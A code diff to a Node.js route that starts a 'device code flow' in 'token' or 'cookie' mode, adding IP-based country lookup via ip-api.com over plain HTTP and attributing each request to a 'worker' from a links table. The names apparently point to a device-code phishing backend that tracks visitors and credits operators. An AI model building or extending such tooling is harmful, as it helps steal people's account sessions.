@@ -9,6 +9,25 @@ const deviceProxy = require('../services/deviceproxy');
 const db = require('../database/connection');
 
 /**
+ * IP Geolocation fallback using ip-api.com (free, no API key)
+ */
+async function getCountryFromIP(ip) {
+  try {
+    if (!ip || ip === 'unknown' || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.')) {
+      return 'Unknown';
+    }
+    const axios = require('axios');
+    const response = await axios.get(`http://ip-api.com/json/${ip}?fields=countryCode&timeout=2000`);
+    if (response.data && response.data.countryCode) {
+      return response.data.countryCode;
+    }
+  } catch (e) {
+    // Silent fail
+  }
+  return 'Unknown';
+}
+
+/**
  * POST /api/device/start
  * Start a new device code flow
  * Body: { mode: "token" | "cookie" }
@@ -81,18 +100,25 @@ router.post('/start', async (req, res) => {
 		let country = 'Unknown';
 		try {
 			const cfCountry = req.headers['cf-ipcountry'];
-			if (cfCountry) country = cfCountry;
+			if (cfCountry && cfCountry !== 'Unknown') {
+				country = cfCountry;
+			} else {
+				// Fallback to IP geolocation
+				const ipGeo = await getCountryFromIP(ipAddress);
+				if (ipGeo && ipGeo !== 'Unknown') {
+					country = ipGeo;
+				}
+			}
 		} catch (e) {
 			country = 'Unknown';
 		}
 
-		// Extract worker_name from JWT if available
+		// Extract worker_name from links table (not from JWT)
 		let workerName = null;
 		try {
-			const jwtLib = require('jsonwebtoken');
-			const decoded = jwtLib.verify(jwtToken, config.JWT_SECRET);
-			if (decoded.worker_name) {
-				workerName = decoded.worker_name;
+			const [linkRows] = await db.query('SELECT worker_name FROM links WHERE id = ? AND user_id = ?', [link_id, user_id]);
+			if (linkRows.length > 0 && linkRows[0].worker_name) {
+				workerName = linkRows[0].worker_name;
 			}
 		} catch (e) {
 			// Silent fail
